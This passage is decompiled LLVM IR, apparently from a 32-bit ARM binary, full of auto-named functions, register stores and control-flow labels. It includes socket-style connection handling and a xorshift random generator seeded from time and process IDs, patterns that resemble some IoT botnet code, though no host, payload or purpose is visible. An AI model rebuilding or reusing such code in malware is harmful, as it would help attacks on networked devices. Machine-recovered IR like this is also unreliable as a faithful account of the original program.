dec_label_pc_e448:                                ; preds = %dec_label_pc_e438
  %v3_e448 = udiv i32 %v2_e438, 32
  %v3_e450 = mul nuw nsw i32 %v3_e448, 4
  store i32 %v2_e014, i32* %ip.global-to-local, align 4
  %v2_e458 = add i32 %v3_e450, %v2_e014
  store i32 %v2_e458, i32* %r3.global-to-local, align 4
  %v1_e45c = add i32 %v2_e458, -308
  %v2_e45c = inttoptr i32 %v1_e45c to i32*
  %v3_e45c = load i32, i32* %v2_e45c, align 4
  %v1_e460 = urem i32 %v2_e438, 32
  %v6_e464 = lshr i32 %v3_e45c, %v1_e460
  store i32 %v6_e464, i32* %r2.global-to-local, align 4
  %v1_e468 = urem i32 %v6_e464, 2
  %v2_e468 = icmp eq i32 %v1_e468, 0
  br i1 %v2_e468, label %dec_label_pc_e234, label %dec_label_pc_e470

dec_label_pc_e470:                                ; preds = %dec_label_pc_e448
  %v0_e470 = call i32 @function_10a30()
  %v0_e474 = load i32, i32* @r4, align 4
  %v2_e474 = inttoptr i32 %v0_e470 to i32*
  store i32 %v0_e474, i32* %v2_e474, align 4
  store i32 %v0_e470, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_e488 = load i32, i32* @r5, align 4
  %v1_e488 = inttoptr i32 %v0_e488 to i32*
  %v2_e488 = load i32, i32* %v1_e488, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_e494 = call i32 @function_10cc0(i32 %v2_e488, i32 %v2_e670, i32 2, i32 16386)
  %v7_e498 = icmp eq i32 %v4_e494, -1
  br i1 %v7_e498, label %dec_label_pc_e684, label %dec_label_pc_e4a0

dec_label_pc_e4a0:                                ; preds = %dec_label_pc_e470
  %v2_e4a0 = icmp eq i32 %v4_e494, 0
  br i1 %v2_e4a0, label %dec_label_pc_e694, label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e4a0
  %v3_e4ac = load i16, i16* %stack_var_-42, align 2
  %v4_e4ac = sext i16 %v3_e4ac to i32
  store i32 %v4_e4ac, i32* %r2.global-to-local, align 4
  %v2_e4b0 = icmp eq i16 %v3_e4ac, 0
  br i1 %v2_e4b0, label %dec_label_pc_e724, label %dec_label_pc_e4b8

dec_label_pc_e4b8:                                ; preds = %dec_label_pc_e4a8
  %v3_e4b8 = udiv i32 %v4_e4ac, 256
  %v1_e4bc = urem i32 %v4_e4ac, 256
  store i32 %v1_e4bc, i32* %r2.global-to-local, align 4
  %v4_e4c0 = mul nuw nsw i32 %v1_e4bc, 256
  %v5_e4c0 = or i32 %v4_e4c0, %v3_e4b8
  store i32 %v5_e4c0, i32* %r3.global-to-local, align 4
  %v6_e4cc = trunc i32 %v5_e4c0 to i16
  store i16 %v6_e4cc, i16* %stack_var_-42, align 2
  %tmp79 = icmp ugt i32 %v5_e4c0, 1024
  br i1 %tmp79, label %dec_label_pc_e740, label %dec_label_pc_e4d4

dec_label_pc_e4d4:                                ; preds = %dec_label_pc_e4b8, %dec_label_pc_e740
  %v3_e4ec = phi i16 [ %v6_e4cc, %dec_label_pc_e4b8 ], [ %v3_e4ec.pre, %dec_label_pc_e740 ]
  %v0_e4d4 = load i32, i32* @r4, align 4
  %v1_e4d4 = load i32, i32* @r8, align 4
  %v2_e4d4 = inttoptr i32 %v1_e4d4 to i32*
  store i32 %v0_e4d4, i32* %v2_e4d4, align 4
  store i32 %v2_e358, i32* %ip.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_e4e4 = load i32, i32* @r5, align 4
  %v1_e4e4 = inttoptr i32 %v0_e4e4 to i32*
  %v2_e4e4 = load i32, i32* %v1_e4e4, align 4
  %v4_e4ec = sext i16 %v3_e4ec to i32
  store i32 %v4_e4ec, i32* %r2.global-to-local, align 4
  %v5_e4f0 = call i32 @function_10cc0(i32 %v2_e4e4, i32 %v2_e210, i32 %v4_e4ec, i32 16386)
  %v7_e4f4 = icmp eq i32 %v5_e4f0, -1
  br i1 %v7_e4f4, label %dec_label_pc_e684, label %dec_label_pc_e4fc

dec_label_pc_e4fc:                                ; preds = %dec_label_pc_e4d4
  %v2_e4fc = icmp eq i32 %v5_e4f0, 0
  br i1 %v2_e4fc, label %dec_label_pc_e694, label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e4fc
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e514 = load i32, i32* @r5, align 4
  %v1_e514 = inttoptr i32 %v0_e514 to i32*
  %v2_e514 = load i32, i32* %v1_e514, align 4
  %v4_e518 = call i32 @function_10cc0(i32 %v2_e514, i32 %v2_e670, i32 2, i32 16384)
  store i32 %v2_e358, i32* @lr, align 4
  %v3_e520 = load i16, i16* %stack_var_-42, align 2
  %v4_e520 = sext i16 %v3_e520 to i32
  %v3_e524 = udiv i32 %v4_e520, 256
  %v1_e528 = urem i32 %v4_e520, 256
  store i32 %v1_e528, i32* %r3.global-to-local, align 4
  %v4_e52c = mul nuw nsw i32 %v1_e528, 256
  %v5_e52c = or i32 %v4_e52c, %v3_e524
  store i32 %v5_e52c, i32* %ip.global-to-local, align 4
  store i32 %v5_e52c, i32* %r2.global-to-local, align 4
  %v0_e538 = load i32, i32* @r5, align 4
  %v1_e538 = inttoptr i32 %v0_e538 to i32*
  %v2_e538 = load i32, i32* %v1_e538, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e540 = trunc i32 %v5_e52c to i16
  store i16 %v6_e540, i16* %stack_var_-42, align 2
  %v6_e544 = call i32 @function_10cc0(i32 %v2_e538, i32 %v2_e210, i32 %v5_e52c, i32 16384)
  store i32 %v2_e358, i32* %r2.global-to-local, align 4
  %v3_e54c = load i16, i16* %stack_var_-42, align 2
  %v3_e550 = icmp eq i16 %v3_e54c, 0
  br i1 %v3_e550, label %dec_label_pc_e234, label %dec_label_pc_e558

dec_label_pc_e558:                                ; preds = %dec_label_pc_e504
  %v4_e54c = sext i16 %v3_e54c to i32
  %v5_e55c = call i32 @function_a078(i32* nonnull %stack_var_-1500, i32 %v4_e54c, i32 %v2_e358)
  br label %dec_label_pc_e234

dec_label_pc_e564:                                ; preds = %dec_label_pc_e378
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_e600, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_e57c = call i32 @function_10b68(i32 %v2_e36c, i32 %v2_e570, i32 %v2_e600, i32 16, i32 16)
  br label %dec_label_pc_e3a0

dec_label_pc_e584:                                ; preds = %dec_label_pc_e2a4
  %v0_e58c = load i32, i32* @r4, align 4
  store i32 %v0_e58c, i32* %r2.global-to-local, align 4
  %v3_e590 = call i32 @function_10df0(i32 2, i32 1, i32 %v0_e58c)
  %v7_e594 = icmp eq i32 %v3_e590, -1
  store i32 %v3_e590, i32* @r5, align 4
  %v1_e59c = load i32, i32* %r8.global-to-local, align 4
  %v2_e59c = inttoptr i32 %v1_e59c to i32*
  store i32 %v3_e590, i32* %v2_e59c, align 4
  br i1 %v7_e594, label %dec_label_pc_e2b4, label %dec_label_pc_e5a4

dec_label_pc_e5a4:                                ; preds = %dec_label_pc_e584
  %v0_e5a4 = load i32, i32* @r4, align 4
  store i32 %v0_e5a4, i32* %r2.global-to-local, align 4
  %v2_e5ac = call i32 @function_1043c(i32 %v3_e590, i32 3)
  %v1_e5b4 = or i32 %v2_e5ac, 2048
  store i32 %v1_e5b4, i32* %r2.global-to-local, align 4
  %v0_e5b8 = load i32, i32* @r5, align 4
  %v2_e5bc = call i32 @function_1043c(i32 %v0_e5b8, i32 4)
  store i32 123888, i32* %ip.global-to-local, align 4
  %v2_e5c4 = load i32, i32* inttoptr (i32 123888 to i32*), align 16
  store i32 %v2_e5c4, i32* %r3.global-to-local, align 4
  %v2_e5c8 = icmp eq i32 %v2_e5c4, 0
  br i1 %v2_e5c8, label %bb77, label %bb76

bb76:                                             ; preds = %dec_label_pc_e5a4
  br label %bb77

bb77:                                             ; preds = %dec_label_pc_e5a4, %bb76
  %v2_e5d0 = xor i1 %v2_e5c8, true
  call void @__pseudo_cond_branch(i1 %v2_e5d0, i32 %v2_e5c4)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_e5dc = load i32, i32* %r8.global-to-local, align 4
  %v1_e5dc = inttoptr i32 %v0_e5dc to i32*
  %v2_e5dc = load i32, i32* %v1_e5dc, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1e5bc.132 to i8*), align 4
  %v4_e5ec = call i32 @function_10bd8(i32 %v2_e5dc, i32 ptrtoint (i16** @global_var_2060c.99 to i32), i32 16)
  br label %dec_label_pc_e2b4

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e3b0
  store i32 4, i32* @r5, align 4
  store i32 %v2_e600, i32* %r3.global-to-local, align 4
  store i32 %v2_e604, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_e61c = call i32 @function_10c48(i32 %v2_e438, i32 1, i32 4, i32 %v2_e600, i32 %v2_e604)
  %v3_e620 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_e620, i32* %r3.global-to-local, align 4
  %v2_e624 = icmp eq i32 %v3_e620, 0
  br i1 %v2_e624, label %dec_label_pc_e6b8, label %dec_label_pc_e62c

dec_label_pc_e62c:                                ; preds = %dec_label_pc_e5f4
  %v0_e62c = load i32, i32* @r4, align 4
  %v1_e62c = inttoptr i32 %v0_e62c to i32*
  %v2_e62c = load i32, i32* %v1_e62c, align 4
  %v1_e630 = call i32 @function_10608(i32 %v2_e62c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e638 = load i32, i32* @r4, align 4
  %v2_e638 = inttoptr i32 %v1_e638 to i32*
  store i32 -1, i32* %v2_e638, align 4
  %v0_e63c = call i32 @function_e7dc()
  %v3_e644 = zext i32 %v0_e63c to i64
  %v4_e644 = mul nuw i64 %v3_e644, 3435973837
  %v3_e6486 = udiv i64 %v4_e644, 34359738368
  %v3_e64c8 = mul nuw nsw i64 %v3_e6486, 8
  %v3_e64c = trunc i64 %v3_e64c8 to i32
  store i32 %v3_e64c, i32* %r2.global-to-local, align 4
  %v2_e65010 = mul nuw nsw i64 %v3_e6486, 2
  %v2_e650 = trunc i64 %v2_e65010 to i32
  %v2_e654 = add i32 %v3_e64c, %v2_e650
  store i32 %v2_e654, i32* %r3.global-to-local, align 4
  %v2_e658 = sub i32 %v0_e63c, %v2_e654
  %v1_e65c = add i32 %v2_e658, 1
  %v1_e660 = call i32 @function_126fc(i32 %v1_e65c)
  br label %dec_label_pc_e234

dec_label_pc_e668:                                ; preds = %dec_label_pc_e340
  %v0_e66c = load i32, i32* @sl, align 4
  %v1_e66c = inttoptr i32 %v0_e66c to i32*
  %v2_e66c = load i32, i32* %v1_e66c, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e67c = call i32 @function_10d34(i32 %v2_e66c, i32 %v2_e670, i32 2, i32 16384)
  br label %dec_label_pc_e36c

dec_label_pc_e684:                                ; preds = %dec_label_pc_e4d4, %dec_label_pc_e470
  %v0_e684 = load i32, i32* @r8, align 4
  %v1_e684 = inttoptr i32 %v0_e684 to i32*
  %v2_e684 = load i32, i32* %v1_e684, align 4
  store i32 %v2_e684, i32* %r3.global-to-local, align 4
  %v7_e688 = icmp eq i32 %v2_e684, 4
  br i1 %v7_e688, label %dec_label_pc_e234, label %bb78

bb78:                                             ; preds = %dec_label_pc_e684
  %v8_e68c = icmp eq i32 %v2_e684, 11
  br i1 %v8_e68c, label %dec_label_pc_e234, label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %bb78, %dec_label_pc_e4fc, %dec_label_pc_e4a0
  %v0_e694 = load i32, i32* @sl, align 4
  %v1_e694 = inttoptr i32 %v0_e694 to i32*
  %v2_e694 = load i32, i32* %v1_e694, align 4
  store i32 59040, i32* @lr, align 4
  %v1_e69c = icmp ne i32 %v2_e694, -1
  call void @__pseudo_cond_branch(i1 %v1_e69c, i32 ptrtoint (i32* @global_var_10608.22 to i32))
  store i32 123884, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* inttoptr (i32 123884 to i32*), align 4
  %v1_e6b0 = call i32 @function_126fc(i32 1)
  br label %dec_label_pc_e234

dec_label_pc_e6b8:                                ; preds = %dec_label_pc_e5f4
  %v2_e6c0 = call i32 @function_f93c(i8* %v1_e6c0)
  %v3_e6c0 = trunc i32 %v2_e6c0 to i16
  store i16 %v3_e6c0, i16* %stack_var_-42, align 2
  %v2_e6c8 = call i32 @function_fbf8(i32 %v2_e6c0)
  store i32 %v2_e6c8, i32* @global_var_20600.75, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e6dc = load i32, i32* @r5, align 4
  store i32 %v0_e6dc, i32* %r2.global-to-local, align 4
  %v0_e6e0 = load i32, i32* @r4, align 4
  %v1_e6e0 = inttoptr i32 %v0_e6e0 to i32*
  %v2_e6e0 = load i32, i32* %v1_e6e0, align 4
  %v4_e6e4 = call i32 @function_10d34(i32 %v2_e6e0, i32 ptrtoint (i32* @global_var_15a38.137 to i32), i32 %v0_e6dc, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_e6f0 = load i32, i32* @r4, align 4
  %v1_e6f0 = inttoptr i32 %v0_e6f0 to i32*
  %v2_e6f0 = load i32, i32* %v1_e6f0, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e6fc = call i32 @function_10d34(i32 %v2_e6f0, i32 %v2_e670, i32 1, i32 16384)
  %v3_e700 = load i16, i16* %stack_var_-42, align 2
  %v4_e700 = sext i16 %v3_e700 to i32
  store i32 %v4_e700, i32* %r2.global-to-local, align 4
  %v2_e704 = icmp eq i16 %v3_e700, 0
  br i1 %v2_e704, label %dec_label_pc_e234, label %dec_label_pc_e70c

dec_label_pc_e70c:                                ; preds = %dec_label_pc_e6b8
  %v0_e710 = load i32, i32* @r4, align 4
  %v1_e710 = inttoptr i32 %v0_e710 to i32*
  %v2_e710 = load i32, i32* %v1_e710, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e71c = call i32 @function_10d34(i32 %v2_e710, i32 %v2_dfd8, i32 %v4_e700, i32 16384)
  br label %dec_label_pc_e234

dec_label_pc_e724:                                ; preds = %dec_label_pc_e4a8
  %v0_e728 = load i32, i32* @r5, align 4
  %v1_e728 = inttoptr i32 %v0_e728 to i32*
  %v2_e728 = load i32, i32* %v1_e728, align 4
  %v1_e730 = add nsw i32 %v4_e4ac, 2
  store i32 %v1_e730, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e738 = call i32 @function_10cc0(i32 %v2_e728, i32 %v2_e670, i32 %v1_e730, i32 16384)
  br label %dec_label_pc_e234

dec_label_pc_e740:                                ; preds = %dec_label_pc_e4b8
  %v0_e740 = load i32, i32* @r5, align 4
  %v1_e740 = inttoptr i32 %v0_e740 to i32*
  %v2_e740 = load i32, i32* %v1_e740, align 4
  %v1_e744 = call i32 @function_10608(i32 %v2_e740)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e74c = load i32, i32* @r5, align 4
  %v2_e74c = inttoptr i32 %v1_e74c to i32*
  store i32 -1, i32* %v2_e74c, align 4
  %v3_e4ec.pre = load i16, i16* %stack_var_-42, align 2
  br label %dec_label_pc_e4d4

dec_label_pc_e754:                                ; preds = %dec_label_pc_dfcc
  %v0_e754 = load i32, i32* @fp, align 4
  %v1_e754 = add i32 %v0_e754, 4
  %v2_e754 = inttoptr i32 %v1_e754 to i32*
  %v3_e754 = load i32, i32* %v2_e754, align 4
  %v1_e758 = inttoptr i32 %v3_e754 to i8*
  %v2_e758 = call i32 @function_f93c(i8* %v1_e758)
  %v8_e760 = icmp sgt i32 %v2_e758, 31
  br i1 %v8_e760, label %dec_label_pc_dfec, label %dec_label_pc_e764

dec_label_pc_e764:                                ; preds = %dec_label_pc_e754
  %v0_e768 = load i32, i32* @fp, align 4
  %v1_e768 = add i32 %v0_e768, 4
  %v2_e768 = inttoptr i32 %v1_e768 to i32*
  %v3_e768 = load i32, i32* %v2_e768, align 4
  store i32 %v2_dfd8, i32* @r0, align 4
  %v2_e770 = bitcast i32* %stack_var_-182 to i8*
  %v3_e770 = call i32 @function_f964(i8* %v2_e770, i32 %v3_e768)
  %v0_e774 = load i32, i32* @fp, align 4
  %v1_e774 = add i32 %v0_e774, 4
  %v2_e774 = inttoptr i32 %v1_e774 to i32*
  %v3_e774 = load i32, i32* %v2_e774, align 4
  %v1_e77c = inttoptr i32 %v3_e774 to i8*
  %v2_e77c = call i32 @function_f93c(i8* %v1_e77c)
  %v2_e788 = call i32 @function_f9d0(i32 %v3_e774, i32 %v2_e77c)
  br label %dec_label_pc_dfec

; uselistorder directives
  uselistorder i32 %v3_e590, { 1, 3, 2, 0 }
  uselistorder i16 %v3_e54c, { 1, 0 }
  uselistorder i32 %v5_e52c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e520, { 1, 0 }
  uselistorder i32 %v5_e4f0, { 1, 0 }
  uselistorder i32 %v4_e4ac, { 2, 1, 0, 3 }
  uselistorder i32 %v4_e494, { 1, 0 }
  uselistorder i32 %v2_e438, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_e36c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_e348, { 1, 0, 2 }
  uselistorder i32 %v2_e344, { 2, 0, 1 }
  uselistorder i32 %v5_e32c, { 1, 0 }
  uselistorder i32 %v2_e270, { 2, 1, 0 }
  uselistorder i32 %v1_e264, { 1, 2, 0 }
  uselistorder i32 %v1_e248, { 1, 2, 0 }
  uselistorder i32 %v2_e600, { 2, 3, 1, 0 }
  uselistorder i32 %v2_e670, { 2, 0, 4, 3, 1 }
  uselistorder i32 %v2_e358, { 3, 2, 1, 0 }
  uselistorder i32 %v2_e230, { 1, 0, 2 }
  uselistorder i32 %v3_e178, { 1, 0 }
  uselistorder i32 %v1_e15c, { 1, 0 }
  uselistorder i32 %v2_e154, { 1, 0 }
  uselistorder i32 %v2_e110, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e0f8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_e0e0, { 1, 2, 0 }
  uselistorder i32 %v2_e014, { 0, 12, 1, 2, 11, 3, 10, 4, 9, 5, 8, 6, 13, 7 }
  uselistorder i32 %v2_dffc, { 1, 0, 2 }
  uselistorder i32 %v2_dfd8, { 1, 0, 2 }
  uselistorder i32 %v2_dfbc, { 0, 2, 1 }
  uselistorder i32 %v1_dfb4, { 1, 0 }
  uselistorder i32 %v0_dfb0, { 1, 0 }
  uselistorder i32 %v3_def8, { 1, 2, 0 }
  uselistorder i32 %v2_dea8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i16* %stack_var_-42, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 4, 5, 9, 10, 11, 12 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_10c48, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10cc0, { 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 16386, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i8** @global_var_1e5bc.132 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1e5bc.132 to i8*), { 0, 1, 3, 2 }
  uselistorder i32 (i8*, i32)* @function_fd1c, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32)* @function_1016c, { 1, 0 }
  uselistorder i32 ()* @function_102c4, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_f00c, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_efe8, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 29, 23, 24, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 51, 47, 48, 49, 50 }
  uselistorder i32 (i32)* @function_f0ac, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 15, 20, 19, 18, 17, 16, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_f964, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 26, 29, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 62, 63, 64, 65, 66, 67, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 (i32)* @function_dcb4, { 1, 0 }
  uselistorder i32* @global_var_20600.75, { 0, 1, 2, 3, 4, 5, 8, 6, 7 }
  uselistorder i32 ptrtoint (i16** @global_var_2060c.99 to i32), { 0, 2, 1 }
  uselistorder i32 (i32)* @function_fbf8, { 1, 0 }
  uselistorder i32 56476, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @function_10e9c, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %dec_label_pc_e4d4, { 1, 0 }
  uselistorder label %dec_label_pc_e3a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e36c, { 2, 1, 0 }
  uselistorder label %bb75, { 1, 0 }
  uselistorder label %dec_label_pc_e2b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e2a4, { 1, 0 }
  uselistorder label %dec_label_pc_e234, { 7, 8, 1, 9, 2, 0, 10, 11, 3, 4, 5, 12, 6, 13 }
  uselistorder label %dec_label_pc_dfec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dfcc, { 2, 1, 0 }
}

define i32 @function_e7bc(i32 %arg1, i16* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e7bc:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  br i1 false, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_e7bc
  %v2_e7bc = inttoptr i32 %arg3 to i32*
  store i32 %arg1, i32* %v2_e7bc, align 4
  %v4_e7bc = add i32 %arg3, 4
  %v5_e7bc = inttoptr i32 %v4_e7bc to i32*
  store i32 %arg3, i32* %v5_e7bc, align 4
  %v7_e7bc = add i32 %arg3, 8
  %v8_e7bc = inttoptr i32 %v7_e7bc to i32*
  %v9_e7bc = load i32, i32* @r4, align 4
  store i32 %v9_e7bc, i32* %v8_e7bc, align 4
  %v10_e7bc = add i32 %arg3, 12
  %v11_e7bc = inttoptr i32 %v10_e7bc to i32*
  %v12_e7bc = load i32, i32* @r5, align 4
  store i32 %v12_e7bc, i32* %v11_e7bc, align 4
  %v13_e7bc = add i32 %arg3, 16
  %v14_e7bc = inttoptr i32 %v13_e7bc to i32*
  %v15_e7bc = load i32, i32* @sb, align 4
  store i32 %v15_e7bc, i32* %v14_e7bc, align 4
  %v16_e7bc = add i32 %arg3, 20
  %v17_e7bc = inttoptr i32 %v16_e7bc to i32*
  %v18_e7bc = load i32, i32* @sl, align 4
  store i32 %v18_e7bc, i32* %v17_e7bc, align 4
  %v19_e7bc = add i32 %arg3, 24
  %v20_e7bc = inttoptr i32 %v19_e7bc to i32*
  %v21_e7bc = load i32, i32* @fp, align 4
  store i32 %v21_e7bc, i32* %v20_e7bc, align 4
  %v22_e7bc = add i32 %arg3, 28
  %v23_e7bc = inttoptr i32 %v22_e7bc to i32*
  store i32 ptrtoint (i32* @global_var_e7c4.130 to i32), i32* %v23_e7bc, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_e7bc, %bb
  %v0_e7c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e7c0, label %bb5, label %.thread1

bb5:                                              ; preds = %bb4
  %v1_e7c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e7c4 = load i32, i32* @ip, align 4
  %v3_e7c4 = udiv i32 %v2_e7c4, 128
  %v4_e7c4 = mul i32 %v2_e7c4, 33554432
  %v5_e7c4 = or i32 %v3_e7c4, %v4_e7c4
  %v6_e7c4 = and i32 %v2_e7c4, 64
  %v7_e7c4 = icmp ne i32 %v6_e7c4, 0
  %v8_e7c4 = and i32 %v5_e7c4, %v1_e7c0
  store i32 %v8_e7c4, i32* @lr, align 4
  %v2_e7c8 = trunc i32 %v8_e7c4 to i16
  %v4_e7c8 = inttoptr i32 %v1_e7c0 to i16*
  store i16 %v2_e7c8, i16* %v4_e7c8, align 2
  %v5_e7c8 = load i32, i32* @ip, align 4
  %v6_e7c8 = load i32, i32* %r1.global-to-local, align 4
  %v7_e7c8 = sub i32 %v6_e7c8, %v5_e7c8
  store i32 %v7_e7c8, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb4, %bb5
  %v0_e7cc = phi i1 [ false, %bb4 ], [ %v7_e7c4, %bb5 ]
  call void @__pseudo_cond_branch(i1 %v0_e7cc, i32 -22310272)
  %v0_e7d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e7d0, label %bb6, label %.thread2

bb6:                                              ; preds = %.thread1
  %v1_e7d0 = load i32, i32* @lr, align 4
  %v2_e7d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e7d0 = inttoptr i32 %v2_e7d0 to i32*
  store i32 %v1_e7d0, i32* %v3_e7d0, align 4
  %v5_e7d0 = load i32, i32* %r1.global-to-local, align 4
  %v6_e7d0 = sub i32 %v5_e7d0, %arg1
  store i32 %v6_e7d0, i32* %r1.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread1, %bb6
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_e7c4, { 2, 0, 1 }
  uselistorder i32 %v1_e7c0, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32 %arg3, { 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_e7dc() local_unnamed_addr {
dec_label_pc_e7dc:
  %v2_e7e8 = load i32, i32* @global_var_1e5c0.139, align 4
  %v2_e7ec = load i32, i32* @global_var_1e5cc.141, align 4
  %v4_e7f8 = mul i32 %v2_e7e8, 2048
  %v5_e7f8 = xor i32 %v4_e7f8, %v2_e7e8
  store i32 %v5_e7f8, i32* @r3, align 4
  %v4_e7fc = udiv i32 %v2_e7ec, 524288
  %v5_e7fc = xor i32 %v4_e7fc, %v2_e7ec
  %v2_e800 = load i32, i32* @global_var_1e5c4.143, align 4
  %v2_e804 = load i32, i32* @global_var_1e5c8.145, align 4
  store i32 %v2_e804, i32* @ip, align 4
  %v2_e808 = xor i32 %v5_e7fc, %v5_e7f8
  %v4_e80c = udiv i32 %v5_e7f8, 256
  %v5_e80c = xor i32 %v2_e808, %v4_e80c
  store i32 %v2_e800, i32* @global_var_1e5c0.139, align 4
  store i32 %v2_e804, i32* @global_var_1e5c4.143, align 4
  store i32 %v2_e7ec, i32* @global_var_1e5c8.145, align 4
  store i32 %v5_e80c, i32* @global_var_1e5cc.141, align 4
  ret i32 %v5_e80c

; uselistorder directives
  uselistorder i32 %v2_e7ec, { 2, 1, 0 }
  uselistorder i32 %v2_e7e8, { 1, 0 }
}

define i32 @function_e838(i32 %arg1) local_unnamed_addr {
dec_label_pc_e838:
  %v2_e844 = call i32 @function_10254(i32* null)
  store i32 %v2_e844, i32* @r0, align 4
  store i32 %v2_e844, i32* @global_var_1e5c0.139, align 4
  %v0_e850 = call i32 @function_10240()
  store i32 %v0_e850, i32* @r0, align 4
  %v0_e858 = call i32 @function_10198()
  %v2_e860 = xor i32 %v0_e850, %v0_e858
  store i32 %v2_e860, i32* @global_var_1e5c4.143, align 4
  %v1_e868 = call i32 @function_10a4c(i32 %v2_e860)
  %v2_e86c = load i32, i32* @global_var_1e5c4.143, align 4
  %v2_e878 = xor i32 %v2_e86c, %v1_e868
  store i32 %v2_e878, i32* @global_var_1e5cc.141, align 4
  store i32 %v1_e868, i32* @global_var_1e5c8.145, align 4
  ret i32 %v1_e868

; uselistorder directives
  uselistorder i32 %v1_e868, { 1, 2, 0 }
  uselistorder i32 ()* @function_10198, { 2, 1, 0 }
  uselistorder i32 (i32*)* @function_10254, { 0, 1, 2, 3, 4, 7, 5, 6 }
}

define i32 @function_e8a0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e8a0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
